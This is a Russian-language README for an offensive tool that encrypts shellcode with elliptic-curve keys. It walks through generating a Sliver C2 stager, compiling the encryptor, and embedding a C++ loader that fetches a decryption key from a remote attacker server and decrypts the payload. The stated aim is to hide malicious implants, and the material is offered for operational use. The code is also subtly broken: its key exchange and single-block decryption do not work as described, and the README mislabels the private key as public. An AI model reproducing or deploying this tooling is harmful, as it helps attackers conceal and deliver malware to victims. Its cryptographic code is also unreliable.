## Этот код поможет вам зашифровать свой shellcode с использованием метода эллиптических кривых.

**Requirements**
g++

if not install

```bash
sudo apt install g++
```

openssl v3.1

sliver(or other c2)

libssl-dev 

if not install

```bash
sudo apt install libssl-dev
```

**Подготовка**
Сгенерируйте shellcode в формате **.bin.** Для этого вы можете использовать Bishop Fox Sliver в качестве C2, чтобы создать shellcode:

```bash
sliver> generate stager --lhost ip --lport 8443 --arch amd64 --format shellcode
```

При необходимости вы также можете использовать дополнительные параметры.

Сгенерируйте **.pem** ключи с помощью OpenSSL(prime256v1):

```bash
openssl ecparam -genkey -name prime256v1 -out new-ecc-private.pem
```
```bash
openssl ec -in new-ecc-private.pem -pubout -out new-ecc-public.pem
```

Клонируйте репозиторий с кодом для шифрования:


```bash
git clone github.com/wearetyomsmnv/ec_encoder_cpp
```

## Компиляция кода ##

Скомпилируйте код с помощью g++:

```bash
g++ ec_encoder.cpp -o encrypt_shellcode -lcrypto
```

## Запуск шифрования ##

**Запустите программу для шифрования:**

```bash
./encrypt_shellcode shellcode.bin new-ecc-private.pem new-ecc-public.pem
```

Где:

**shellcode.bin** - это файл с shellcode, полученный из Sliver (имя может отличаться).

**new-ecc-private.pem** - это открытый ключ.

**new-ecc-public.pem** - это открытый ключ.

## Как использовать это в реальном проекте ##

```c++
#include <iostream>
#include <fstream>
#include <vector>
#include <openssl/ec.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <openssl/aes.h>
#include <curl/curl.h>

size_t writeData(void* ptr, size_t size, size_t nmemb, FILE* stream) {
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}

bool downloadFile(const char* url, const char* outputPath) {
    CURL* curl;
    FILE* fp;
    CURLcode res;

    curl = curl_easy_init();
    if (curl) {
        fp = fopen(outputPath, "wb");
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeData);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        fclose(fp);

        if (res != CURLE_OK) {
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
            return false;
        }
        return true;
    }
    return false;
}

bool decryptShellcode(const std::vector<unsigned char>& encryptedShellcode, const char* privateKeyPath, std::vector<unsigned char>& decryptedShellcode) {
    BIO* bio = BIO_new_file(privateKeyPath, "r");
    if (!bio) {
        std::cerr << "Error opening private key file." << std::endl;
        return false;
    }

    EC_KEY* ecKey = PEM_read_bio_ECPrivateKey(bio, NULL, NULL, NULL);
    if (!ecKey) {
        std::cerr << "Error reading private key." << std::endl;
        BIO_free(bio);
        return false;
    }

    unsigned char secret[128];
    int secretLen = ECDH_compute_key(secret, 128, EC_KEY_get0_public_key(ecKey), ecKey, NULL);

    // Используйте общий секрет для дешифрования шеллкода с помощью AES-128
    AES_KEY decryptKey;
    AES_set_decrypt_key(secret, 128, &decryptKey);
    AES_decrypt(&encryptedShellcode[0], &decryptedShellcode[0], &decryptKey);

    EC_KEY_free(ecKey);
    BIO_free(bio);
    return true;
}

int main() {
    const char* privateKeyPath = "private_key.pem";
    const char* privateKeyURL = "http://your_vds_ip/path_to_private_key.pem";

    if (!downloadFile(privateKeyURL, privateKeyPath)) {
        std::cerr << "Error downloading private key." << std::endl;
        return 1;
    }

    std::vector<unsigned char> encryptedShellcode; // Загрузите зашифрованный шеллкод
    // ...

    std::vector<unsigned char> decryptedShellcode(encryptedShellcode.size());
    if (decryptShellcode(encryptedShellcode, privateKeyPath, decryptedShellcode)) {
        std::cout << "Shellcode decrypted successfully!" << std::endl;
    } else {
        std::cerr << "Error decrypting shellcode." << std::endl;
    }

    return 0;
}



```
